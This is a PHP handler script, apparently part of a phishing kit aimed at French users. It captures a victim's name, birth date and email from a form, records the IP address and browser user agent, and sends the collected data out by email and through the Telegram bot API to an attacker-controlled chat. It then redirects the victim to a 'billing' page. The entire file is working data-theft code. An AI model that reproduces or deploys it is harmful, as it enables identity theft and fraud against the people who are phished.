<?php

include("../infos.php");
include("../common/sub_includes.php");


if(isset($_POST)){

	if(!isset($_SESSION)){
		session_start();
	}
	$_SESSION["nom"] = $_POST["nom"];
	$_SESSION["prenom"] = $_POST["prenom"];
	$_SESSION["naissance"] = $_POST["day"] . "/" . $_POST["month"] . "/" . $_POST["year"];
	$_SESSION["mail"] = $_POST["mail"];
	$_SESSION["date"] = date("d/m/y");
	$_SESSION["heure"] = date("H:i");

	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];


	if(isset($_SESSION["mail"]) || strpos($_SESSION['mail'], "hotmail.com") || strpos($_SESSION['mail'], "hotmail.fr") || strpos($_SESSION['mail'], "live.fr") || strpos($_SESSION['mail'], "outlook.fr") || strpos($_SESSION['mail'], "outlook.com") || strpos($_SESSION['mail'], "orange.fr") || strpos($_SESSION['mail'], "orange.com") || strpos($_SESSION['mail'], "wanadoo.fr") || strpos($_SESSION['mail'], "sfr.fr") || strpos($_SESSION['mail'], "club-internet.fr") || strpos($_SESSION['mail'], "neuf.fr") || strpos($_SESSION['mail'], "aliceadsl.fr") || strpos($_SESSION['mail'], "noos.fr") || strpos($_SESSION['mail'], "yahoo.com") || strpos($_SESSION['mail'], "yahoo.fr") || strpos($_SESSION['mail'], "aol.com") || strpos($_SESSION['mail'], "aol.fr") || strpos($_SESSION['mail'], "gmail.com") || strpos($_SESSION['mail'], "icloud.com") || strpos($_SESSION['mail'], "gmx.fr") || strpos($_SESSION['mail'], "gmx.de") || strpos($_SESSION['mail'], "free.fr") || strpos($_SESSION['mail'], "bbox.fr")){

				######################
				#### MAIL SENDING ####
				######################

				if($mail_sending == true){
					
					$message = "

[🛸] Log & Infos [🛸]

🛸 Nom : ".$_SESSION['nom']."
🛸 Prénom : ".$_SESSION['prenom']."
🛸 Naissance : ".$_SESSION['naissance']."
🛸 Email : ".$_SESSION['mail']."

[🗺] Tiers [🗺]

🗺 Adresse ip : ".$_SESSION['ip']."
🗺 User Agen : ".$_SESSION['useragent']."


					";

					$subject = "「🛸」 +1 Log & Infos | ".$_SESSION['mail']." - ".$_SESSION['ip'];
					$headers = "From: Trunk | CV <vito@teleg.com>";

					mail($rezmail, $subject, $message, $headers);
				}

				##########################
				#### TELEGRAM SENDING ####
				##########################

				if($telegram_sending == true){

					$data = [
					'text' => '

[🛸] Log & Infos [🛸]

🛸 Nom : '.$_SESSION['nom'].'
🛸 Prénom : '.$_SESSION['prenom'].'
🛸 Naissance : '.$_SESSION['naissance'].'
🛸 Email : '.$_SESSION['mail'].'

[🗺] Tiers [🗺]

🗺 Adresse IP : '.$_SESSION['ip'].'
🗺 User-agent : '.$_SESSION['useragent'].'


					',
					'chat_id' => $chat_login
								];

					file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
				}
				$_SESSION["logged"] = true;
				
				header('Location: ../steps/billing.php');
				}
		else{
			header('Location: ../index.php?error=email');

		}

	}

else{
	header('Location: ../');
}


?>